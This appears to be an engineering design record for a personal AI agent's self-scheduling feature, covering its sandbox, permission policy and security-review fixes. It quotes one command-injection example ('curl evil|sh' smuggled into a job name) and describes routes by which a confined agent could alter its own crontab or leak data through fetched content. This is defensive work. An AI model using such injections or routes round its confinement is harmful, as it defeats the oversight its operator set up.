# Task — schedules and reminders Marlow can set for itself

**Status: SHIPPED and DEPLOYED 2026-08-30. All three defects found in the first
hour FIXED 2026-08-31, merged and deployed (the drift notice too).** The store,
validator, `file_policy` auto-allow, systemd timer migration and `notify` push
path were verified on the box end to end on day one, including a real APNs
delivery. Timing was the part that did not work; the fix is that **the harness
converts to system-local time itself** rather than trusting a `CRON_TZ` this
cron does not implement. Supersedes `schedule-timezone-following.md`, whose
decision rule fired and which is also where the wrong `CRON_TZ` claim originated.
Compressed 2026-10-26: the build plan, specs and test lists are cut; git history has the full version.

## Why now: the decision rule fired

`schedule-timezone-following.md` said build when "a second trip makes the hand
edit recurring rather than a one-off." It had:

- **2026-08-25**: a recurring evening reminder fired near midnight in the zone
  Mike was visiting. The crontab held wall times in the box's zone, chosen to
  land right in Eastern; Mike was in a different zone.
- **2026-08-23**: a reminder set via `CronCreate` was session-scoped with a 7-day
  expiry, so it silently stopped being a reminder.
- **2026-08-24**: a reminder set via claude.ai routines fired and pushed to the
  **Claude** iOS app, not Marlow's.

All three were learned in Marlow's own memory on the box, not in this repo. The
decision rule sat here while the evidence accumulated there, and nothing
reconciled the two.

## The three wants, which turn out to be one feature

1. **Schedules that follow Mike.** "While I'm travelling, send me things at 9:30 local."
2. **Schedules changeable by asking.** "Change all those back to 07:45 please", in
   a sentence, with no SSH session.
3. **One-off reminders**, of two kinds: a string for Mike's lock screen ("remind
   me at 2pm I wanted to go to the store"), and a deferred prompt *to Marlow*
   ("remember to research heat pump rebates on Sunday night").

They share a store, a validator, a timezone and a delivery path. Splitting them
would build that machinery two or three times.

## Why Marlow cannot just edit the crontab

Three layers stop it. Only the third is deliberate, and the confusion about which
is which shaped the design.

1. **A phone prompt.** `crontab` is not in `boundaries.VETTED_COMMANDS`, so it
   falls through like any unrecognised verb. The default, not a cron rule.
2. ~~**`PR_SET_NO_NEW_PRIVS`.**~~ **RETIRED; do not rely on it.** The original
   claim: bubblewrap sets no_new_privs, `crontab(1)` is setgid `crontab`, and
   under no_new_privs the setgid bit is inert, so the command fails *after* Mike
   approves it (the behaviour he remembered).

   Shipping the renderer broke that. `deploy/marlow-server.service` now carries
   `SupplementaryGroups=crontab` and `/var/spool/cron/crontabs` in
   `ReadWritePaths` so the harness can install the crontab under no_new_privs, and
   both are properties of the **whole unit**: the CLI is an ordinary child, so the
   sandbox inherits the group *and* the writable spool, the setgid binary is no
   longer needed (a plain append to `crontabs/marlow` is picked up from the
   directory mtime), and an approved `crontab` prompt now **succeeds**. Found by
   `/security-review` 2026-08-30.

   **What replaced this layer is a hook deny on `boundaries.HARNESS_ONLY_PATHS`**
   (`/var/spool/cron`), and it stayed deny-only because the box probe cut the fix
   down. Under the unit's own credentials (run as the admin user; `marlow` has no sudo, and
   `--uid=marlow` sets the identity):

   ```sh
   ssh <admin-user>@marlow 'sudo systemd-run --uid=marlow --property=SupplementaryGroups=crontab \
     --pipe --quiet --wait /bin/sh -c '"'"'echo "bare=$(id -G)"; echo "bwrap=$(bwrap --dev-bind / / --die-with-parent -- id -G)"'"'"''
   ```

   ```
   bare=984 997
   bwrap=984 65534
   ```

   GID 997 has no mapping in bwrap's unprivileged user namespace, so it flattens
   to the overflow GID; the spool is `1730 root:crontab`, so a **confined** agent
   cannot traverse it, let alone append. **With bwrap on, the kernel already held
   the line.** The inheritance is real; the exploit needed bwrap off. (The obvious
   `ssh marlow@marlow 'id -G'` answers nothing: the *account* is not in group
   `crontab` (`getent group` shows `crontab:x:997:` with no members), only the
   unit is. That first probe cost a round trip.)

   A bwrap tmpfs for `/var/spool/cron` was written and then **cut** (Mike, on
   complexity, 2026-08-30): with bwrap on it duplicated the user namespace, with
   bwrap off it does not exist. It would only defend "if userns GID flattening
   ever stops holding". Do not re-add it without a reason that survives the
   probe. Known gap, accepted: the deny fires on commands that *name* a
   `/var/spool/cron` path, so a bare `crontab <file>` still falls to a phone
   prompt; with bwrap off and an approval it succeeds, and `bwrap_enabled=0` is a
   dev-machine hatch, not the box. The group cannot be dropped before the exec:
   `setgroups(2)` needs `CAP_SETGID` and the server is unprivileged (EPERM).

3. **The deliberate rule** (`deploy/README.md` §6a/§6b): a crontab line may only
   invoke the root-owned `/opt/marlow/cron/entrypoint.py <job>` or a root-owned
   promoted script. Never a path in Marlow's working tree: a script Marlow can
   rewrite and cron then runs is a daily execution surface with no hook, no
   `boundaries.py` and no namespace.

**The distinction that unlocked the design:** rule 3 governs *what a cron line
executes*; nothing governs *when it fires*. Marlow can be given the schedule
without the command. Mechanical blockers to a direct edit also hold: `crontab -e`
needs a TTY; `crontab <file>` needs a temp file outside the tree, which
`file_policy` **denies**; `crontab -` abandons vetting and is auto-denied
unattended.

## `/security-review`, 2026-08-30: three findings, all fixed

All three were in the *host-level* changes made to let the harness call
`crontab`; the store-to-crontab data path came back clean (ids and job names share
`[a-z0-9-]{1,40}`, so no `%`, space or newline can reach a command field).

1. **The unit-wide `crontab` group (above).** Reported as the one that mattered;
   the box probe downgraded it, and the fix shrank to a hook deny. The finding's
   **mechanism was right and its severity was wrong**, and nothing but measuring
   on the real box separated those. The first fix was written before the probe, so
   it hardened a case the kernel already covered. **Probe first when the probe is
   one command.**
2. **The install temp file was raceable.** `install()` wrote the table to a
   `NamedTemporaryFile` in the unit's `/tmp` and passed it by path; the sandbox
   shares that `/tmp` read-write under the same uid (`--dev-bind / /`, no
   `--tmpfs /tmp`), and `--die-with-parent` does not stop a double-forked watcher
   (no `--unshare-pid`, no `start_new_session`, no `killpg`), so a `marlow` process could rewrite the file
   between write and exec. Now `crontab -` over stdin: a pipe has no name to race for.
3. **Root seeded the store into the agent-writable tree.** `update.sh` ran
   `install -d` on `$WORKING_DIR/cron`. Plain `install` does not write through a
   symlinked file (coreutils sets `unlink_dest_before_opening`, so it replaces the
   link), but `install -d` **follows a symlinked directory** (gnulib `mkdir-p` sets `NOFOLLOW` only where `mkdir` succeeded), so
   an existing `cron -> /etc/cron.d` would have had `/etc/cron.d` chowned to
   `marlow`. Now seeded under `sudo -u "$MARLOW_USER" -H`.

The shape worth remembering: **the feature's security was fine; the privilege it
needed was granted at the wrong scope.** Two of three came from giving the whole
unit something only one process needed.

## Design

### The harness installs the crontab; Marlow never invokes anything

Mike, 2026-08-28, by analogy to `server/identity_git.py`: don't give Marlow a
root-effective script to call; have the harness do the privileged thing, as
`commit_after_turn` does. It needs **no root at all**: the server runs as
`marlow`, so `crontab` installs `marlow`'s own crontab natively. The unit keeps
`NoNewPrivileges=true` and grants `SupplementaryGroups=crontab` and the exact
`ReadWritePaths` exception up front instead of weakening hardening for every
child. The renderer is tamper-proof for free: `~marlow/marlow-server` is outside
`WORKING_TREE`, so `file_policy` refuses the write. No `/opt/marlow/bin` entry, no
`sudo`, no promotion step, and `cron-script-confinement.md`'s unconfined-script
list does not grow.

**The cost, stated plainly.** The harness runs **outside bwrap with more
authority than the agent**, so anything it consumes from the working tree is
model-written input processed at elevated privilege, which is what `.git/config`
was in the 2026-08-08 finding. `cron/schedules.json` is that same shape. Moving
the renderer into the harness makes the validator the only thing standing there.

### The store: `$MARLOW_WORKING_DIR/cron/schedules.json`

Marlow writes **no command field**, ever. Otherwise the renderer would have to
parse and validate a command, the denylist shape that let `git diff --no-index`
read `~/.ssh`. Three entry kinds, distinguished by payload key:

- **`notify`**: a string for Mike, no model turn.
- **`prompt`**: inline text, one-off or recurring, run as a normal cron turn.
- **`job`**: the prompt comes from `cron/<job>.md`.

`at` is a one-off wall time; `cron` a five-field recurring expression. Both are
interpreted in the store's `timezone`, so the store expresses Mike's **intent**
times and a trip is a one-line change.

**Validation is allowlist-shaped and is the boundary.** Job name
`^[a-z0-9-]{1,40}$` (load-bearing: **cron pipes every line through `/bin/sh`**, so
`morning-scan; curl evil|sh` is the attack and the charset is the defence) and
`cron/<job>.md` must exist; `cron` is five fields of `^[0-9*,/-]+$` (no `%`);
`at` is strict ISO local with no offset; `timezone` reuses
`turn_context.is_valid_timezone` (do not write a second validator); a frequency
floor of one fire per 15 minutes and an entry cap (~30), a starting point whose
real constraint is the 240 s prompt-cache window (`gate1-results` §8b) and
`scheduled-work.md`'s "prefer fewer, coarser jobs"; **any failure aborts the
whole render** and the previous crontab stays installed. Never partial: a
half-applied schedule is worse than a stale one, and the v1 failure this design
exists to prevent was a scan that quietly stopped firing.

**The renderer owns the entire crontab**, including the `MAILTO`/`MARLOW_*`
preamble that `deploy/README.md` §6a had Mike hand-writing. Values come from the
server's settings, so supported path overrides cannot split cron from the running
service. **A hand edit to the crontab is clobbered** on the next render.

### The approval split: dynamic jobs, Mike's ok on the text

Mike, 2026-08-28: a fixed list of job names in Python is too static; Marlow
designing a job for itself is much of the point. **The existence of an approved
`cron/<job>.md` is the allowlist.**

- **`cron/schedules.json`** gets an auto-allow as a **named file, not a second
  `WRITABLE_SUBTREE`**. The narrowness of `memory/` is load-bearing:
  `SOUL.md`/`USER.md` sit at the tree root and
  `test_identity_files_are_not_writable_unattended` requires that rewriting
  Marlow's character reach Mike's phone. (The match requires the path to agree on
  both `normpath` and `realpath`, so a `cron/schedules.json` symlinked at `SOUL.md`
  prompts.)
- **`cron/*.md`** stays outside `memory/`: PROMPT when attended, deny when unattended.

Net: scheduling is free, authoring costs an approval. This depended on
`vetted-git-write-primitive.md` closing first: `git log --output=cron/x.md` was a
*vetted* write, so Marlow could have authored its own unattended job with no
human in the loop. Inert until this feature could add a crontab line; that
prerequisite closed before merge.

### `notify` is a synthetic turn, not a bare push

The delivery path is turn-shaped (`push.py`'s `ref` is a turn ID, `GET /v1/pending`
drains turns, the tap fetches `GET /v1/turn/{ref}`). A push with no turn behind
it reproduces the 2026-08-07 bug: banner arrives, Mike taps, app opens to nothing
(`ios-unsolicited-turns.md`). So `notify` enqueues a turn whose reply is
**pre-written** via `WorkQueue.post_system_message`, and `claude -p` is never
invoked: no tokens, no ~58K identity re-injection, and the transcript, drain and
tap-to-refresh come free.

**`notify` bodies ride in the APNs alert (decided 2026-08-28).** `push.py` is
content-free by design; `notify` is a deliberate exception, on the reasoning the
module already grants the two auth types. For a briefing, "Marlow has something
for you" is fine because Mike opens it anyway. For a reminder the **lock screen is
the entire product**; if he has to tap, unlock and wait for a tailnet fetch, it
has failed. Scoped tightly to `notify` only; `job` and `prompt` replies keep the
generic body. This raises the value of Half B of
`ios-notification-open-and-content-swap.md` rather than retiring it.

### `prompt` jobs run with the full cron toolset (decided 2026-08-28)

The first draft stripped `WebFetch` from inline `prompt` turns, on the theory
that a model-authored prompt running unattended plus unprompted cron `WebFetch`
plus egress still deferred is an exfiltration path with no human at any point.
**Mike rejected it, and it was wrong on its own terms.** The split was "did a
human write the prompt text", but the prompt text is not the injection carrier,
the *content the job reads* is. `morning-scan` is a Mike-approved `.md` that
reads his Gmail with unprompted `WebFetch`; a self-authored "research heat pump
rebates" prompt reads a public page and never touches his mail. On the real risk
axis the approved job is the more exposed one, so the rule would have hobbled the
safer path while waving through the riskier. It also broke the feature: anything
useful needs the web, and a permission prompt on a phone at 9pm Sunday with a 60s
window is a denial with extra steps. Recorded so it is not re-litigated. Mike's
framing: **useful personal assistant first, bulletproof second**, with real
confinement coming from OpenShell / NemoClaw. What closes the exposure is the
`deploy/egress.nft` allowlist (bound to the service user, indifferent to where a
fetch came from), not part of this feature and the highest-leverage open item
after it.

## Risks accepted

- **Frequency**: Marlow can schedule aggressively with nobody watching; the
  floor, cap and daily budget (below) are the only control. Token burn and
  queue pressure, not a security boundary.
- **Silent deletion**: Marlow can drop a job from `schedules.json` and a briefing
  stops arriving. Every render diff is logged so the disappearance is greppable.
- **Self-authored unattended prompts** run with full cron tools, per above.
- **Harness-consumed model-written input**: the validator is the boundary.

## Settled 2026-08-28

- **The crontab is a wake-up schedule; the store is the source of truth.** Every
  entry kind goes through cron, with no timer inside the server (that would be the
  tick loop `scheduled-work.md` closed the door on). A crontab line carries an
  **opaque entry id**, `entrypoint.py --entry <id>`, never payload text. So: no
  free text reaches `/bin/sh`; **a stale crontab is harmless** (cron has no year
  field, so a dated one-off would repeat every August 30th, except the entry is
  pruned when it fires and `entrypoint.py` no-ops, exit 0, on an id it cannot
  find); the existing convention barely changes. `job` entries keep the
  `entrypoint.py <job>` form.
- **Accepted limitation:** a one-off whose time passes while the box is down
  never fires (cron's skip-on-downtime, chosen in `scheduled-work.md`). "Fire late
  if still the same local day" is **explicitly not built**: it needs a catch-up
  bound, the first brick of a scheduler. Revisit if Mike misses a reminder to downtime.
- **The render runs after every turn and at startup**, next to
  `commit_after_turn`, **prune and render first, then commit**, so the pruning
  write lands in the same turn's identity commit.
- **Pruning is a harness write; the small cross-process race is accepted.**
  `entrypoint.py` prunes from an independent cron process, so two one-offs in the
  same minute, or one firing while a model turn rewrites the store, can race.
  **Mike accepted it on 2026-08-28**, asked directly, re-confirmed 2026-08-30. (A
  2026-08-30 edit briefly recorded it as unruled, misreading "review" as
  `/code-review`. A review by a *tool* and a review *with Mike* are both reviews,
  and the absence of one says nothing about the other.) Surviving entries are not
  reformatted: Marlow reads this file back.
- **Failure is never fatal to a turn.** Mirrors `identity_git.commit_after_turn`:
  never raises; a malformed store or failed install logs loudly and leaves the
  previous crontab in place.

## Opus review of the first build, 2026-08-30: six findings, all fixed

The implementor's build was sound. Two findings were serious, both the same
shape: **a string Marlow picks was being used where a string Mike approved was
expected.**

- **An entry id was passed as a job name.** `_run_entry` sent `entry.id` in
  `/internal/cron/message`'s `job` field, which `app.py` tests against
  `ATTACHED_SESSION_JOBS`/`RETIRING_JOBS`. A store entry named `consolidate`
  would have run model-authored unattended text **resumed inside Mike's live
  phone session** and retired that session. Fixed structurally: the body takes
  **exactly one of `job` or `entry`**, and the `entry` branch returns before the
  attach lookup exists, so a model-controlled id has nowhere to arrive that
  selects behaviour.
- **The first render would have deleted five jobs and a promoted script.** The
  renderer installs the *complete* crontab and nothing seeded the store from what
  was installed, so the first reminder Marlow wrote would have replaced the whole
  table with one line (and the promoted `trello-sync.sh` is not expressible, the
  store having no command field). Three parts, working together:
  `schedules.foreign_command_lines` makes `install()` refuse to replace a crontab
  containing a line the renderer could not have emitted (deliberately not a
  job-name diff: removing an owned entry is a legitimate edit);
  `deploy/marlow-trello-sync.{service,timer}` (the §6b path) plus `update.sh`
  deleting the migrated cron lines so they cannot double-fire; and
  `deploy/schedules.seed.json`, installed **only when absent** (overwriting would
  undo every schedule change Mike asked for). The seed uses the box's own zone, so
  migrating changes nothing about when anything fires; fixing the times is then a
  sentence to Marlow, not a deploy, and not mixed into an irreversible migration.
- **`notify` was a new push type with no client:** `marksChatUnread` and
  `TurnReadySoundTracker` switch on `type == "turn_ready"`, so a reminder badged
  the icon without unread state and re-played the sound iOS already played on the
  lock screen. Two one-liners in `APNsRegistrar.swift`. (Confirmed on the device
  on deploy day.)
- **A skipped one-off was silent:** now logs WARNING when it prunes a missed one.
  The minute-boundary race (cron fires at :00, three imports later it is :01) is
  **documented, not fixed**; a grace window is the first brick of the catch-up
  bound. Revisit if observed.
- **A missing store logged ERROR every turn**, burying the one rejection that
  mattered; `load()` now returns `None` quietly for a nonexistent file.
- **An over-long `notify` body killed the push:** APNs rejects payloads over 4KB
  outright, so the lock screen would have gone blank rather than truncated.
  `push._clamp_alert_body` caps at 3500 bytes on a UTF-8 boundary.

## The frequency floor is per-entry; the budget is store-wide (2026-08-30)

`/code-review medium`: `MIN_FIRE_INTERVAL_MINUTES` bounds one expression, not
thirty. Thirty entries each on the 15-minute floor is **2880 turns a day**. Fixed
with `MAX_DAILY_FIRINGS = 96` summed across cron entries in `load()` (real use is
~3 a day, so 30x headroom). **A store-wide minimum GAP was the obvious fix and is
wrong**: it would reject Mike's own live schedule, where two jobs fire three
minutes apart every Monday. Two turns close together cost nothing; daily volume
does (`test_two_entries_minutes_apart_are_accepted` pins that). Day/month/weekday
fields are ignored in the count (they can only remove days, so it overcounts, the
safe direction). `at` entries are outside the budget: each fires once and prunes,
so `MAX_ENTRIES` bounds them. Thirty one-offs sharing a minute would queue thirty
turns at once, which the work queue serializes and drains in ~10 minutes:
accepted, not machined around. Migration runbook: `deploy/README.md` §6c.

## Deployed 2026-08-30: verified end to end, and three defects in the first hour

**Verified on the box, worth not re-testing:**

- **Idempotence.** A second restart logged nothing: no diff, no `crontab REPLACE`.
  That is the byte-for-byte equality `install()` rests on, and no test can reach
  it (`crontab -l` is not guaranteed to return what was installed; Vixie prepends
  a header). `deploy/README.md` §6c step 1 re-checks it on any host.
- **The whole notify path, including APNs.** A one-off set two minutes out fired,
  created a turn, pruned itself and arrived on the phone: one sound, badge set,
  badge cleared on open. That closed the iOS half no simulator could prove.

### Defect 0 (fixed 2026-08-30): the capability shipped without telling the agent

Everything worked and the feature still did not exist from Marlow's point of
view: its identity still said "cron changes are Mike's to apply" and "job timing
is his to change", written for the hand-edited crontab. Asked for a reminder, it
reached for the Claude Code `schedule` skill and then `sleep 300`. It was obeying
its rules. Fixed in the live identity and `identity/CLAUDE.md`, and promoted to a
workflow rule (`docs/marlow-v2-workflow.md` step 7, plus a `CLAUDE.md` working
rule). **An identity that merely omits a new capability is not neutral. It
produces confident routing to whatever mechanism the model CAN see.**

### Defect 1 (FIXED 2026-08-31): `CRON_TZ` is not implemented by this cron

**The whole timezone feature did nothing.** `cron 3.0pl1-184ubuntu2` (Debian's
cron, what Ubuntu ships) has no `CRON_TZ`: not in `man 5 crontab`, and the only
timezone-ish string in `/usr/sbin/cron` is `localtime`. The line is silently
accepted as an ordinary environment variable. Every entry fired at **box-local
time** regardless of the store; changing the store's zone rewrote, validated,
rendered and installed, and changed nothing about when anything ran. Every
observable except the firing said it worked.

**Where the error came from:** `schedule-timezone-following.md` said on
2026-08-08 that "Vixie cron honours `CRON_TZ`". True of Vixie cron, false of
Debian's. Written once, never checked against the box, and this design was built
on it. One `strings` call would have settled it. Same shape as the group-ID probe
earlier the same day, except that one was measured before shipping.

**Worse than a wrong time for one-offs:** an `at` entry invoked at the wrong
minute hits `entrypoint.py`'s late-fire guard, which sees `local_now > scheduled`
and **prunes without notifying**. A timezone mismatch produces silence, not a
late reminder, which is how it was found.

### Defect 2 (FIXED 2026-08-31): `at` floats, so changing the zone retimes it

`at` is a wall-clock string with no offset, resolved against the store's
`timezone` *at fire time*, so editing an unrelated field retimes every pending
one-off: a reminder set for 22:14 in one zone silently became 22:14 in another,
moved by the offset between the two zones (a half-hour-offset zone). Observed live.

### Defect 3 (FIXED 2026-08-31): a prune does not trigger a render

`entrypoint.py` prunes in a separate process and nothing re-rendered the crontab,
so the dead (yearless) line survived until the next store write or restart.
Harmless but untidy; lowest severity.

## The fix, 2026-08-31: the harness converts, cron is told absolute times

Mike's call, 2026-08-30: **do not ask cron to do anything difficult.** The store
keeps the timezone; **the harness renders to system-local time**, no `CRON_TZ`
line at all. Do not build a scheduler (`scheduled-work.md`). Making system-local
UTC would make conversion cleaner (Mike, same evening) but is an independent host
change; the renderer must be correct either way, do not couple them.

**Recurring entries** are expanded into times of day, each converted with libc's
`localtime`, then regrouped one crontab line per local hour. Three things forced
that over an hour shift:

- **Fractional offsets.** A half-hour offset between the zones moves the *minute*
  too, and one store expression can land on several local hours: `0,30 8 * * *`
  renders as a minute-30 line in one local hour **and** a minute-0 line in the
  next.
- **Day crossings.** Monday 09:00 in Sydney is Sunday 17:00 in Alberta, so the
  weekday field rotates: `0 9 * * 1,3` → `0 17 * * 0,2`.
- **What cannot be expressed.** A day-of-month or month restriction that crosses
  midnight has no five-field spelling, so the store is **rejected** rather than
  fired on the wrong date. The check runs in `load()`, not `render()`: review
  2026-08-31 caught it in `render()`, where the store would validate, the model
  would see a clean file, and every later render would fail, silently freezing the
  crontab for every other entry. The tradeoff: a store can stop being accepted
  without being edited, since conversion depends on today's offset; loud beats
  silent, and the ERROR names the expression.

**One-offs are pinned to an instant** on the next sync: `"2026-08-30T22:14"`
becomes `"2026-08-30T22:14<offset>"` and that offset wins over `timezone` forever.
Recurring entries are deliberately *not* pinned ("07:45 wherever I am" is what a
repeating schedule means). The late-fire guard compares **instants**, so a store
zone disagreeing with the box is harmless instead of silent. A fired one-off
re-renders in the same process, removing its own dead line.

**The DST caveat, written down rather than engineered around** (Mike): conversion
uses today's offset between the two zones, so a schedule crosses a DST boundary
wrong if the zones change offset on different dates. It self-heals on the next
turn, because `sync_after_turn` re-renders every turn and compares byte-for-byte.
Within North America the transition dates match, so the window is theoretical;
between North America and Europe it is real for a few weeks a year, and the
exposure is one hour on a recurring entry.

**What no test can prove**, as on day one: that `crontab -l` returns exactly what
was installed. Re-run `deploy/README.md` §6c step 1 after deploying. Also added an
autouse fixture making the real `crontab` unreachable from the suite: the defect 3
fix made the one-off tests reach `install()` for real, one `crontab -` from
installing a table nobody asked for on a laptop.

## The drift notice, 2026-08-31: the harness notices he moved

**Merged and deployed 2026-08-31;** identity line live the same day. The
conversion makes the store's `timezone` the one field that must be right, and
nothing kept it right. Marlow sees Mike's zone in the per-turn context but the
store is a file, so noticing would mean reading it every turn against the chance
a value changes twice a year. The harness holds both halves
(`pairing.latest_timezone()` and the store), so `turn_context` says it, only when
the two disagree: "His schedule store is set to America/Edmonton, so its
recurring jobs are firing <N> hours later than the times written in it."

- **Offsets, not zone names.** `America/Denver` and `America/Edmonton` are
  different strings and identical schedules; comparing names would nag with no
  correction behind it, and a line that fires when nothing is wrong stops being read.
- **Ask, don't auto-change** (Mike). A wrong auto-change is silent and hard to
  attribute (a phone reporting a transient zone would retime the morning scan,
  noticed days later as "why did that arrive at 4am"); an unnecessary question
  costs one sentence. The identity carries the rule; this module states the fact.
- **Read the file directly, not through `load()`:** `schedules.py` imports
  `is_valid_timezone` from `turn_context` (a cycle otherwise), and a full
  validation per turn is the wrong price for a hint. A store too broken to parse is
  `load()`'s to reject; the notice stays silent rather than report it twice.

**Best-effort by construction:** Marlow only notices on a turn. Land at 11pm and
the morning scan fires on the old zone before the first message. Closing that
means the server acting on the phone's report unprompted, the auto-change decided
against above.

**Verified live, 2026-08-31.** Not by the notice firing (store and phone agreed,
so it correctly said nothing) but by what it depends on: `settings.schedules_path`
is now the single definition of the store path, and the box's five crontab lines
came back byte-identical after the deploy. Had that path moved, the startup sync
would have rendered from an empty store and silently wiped them.
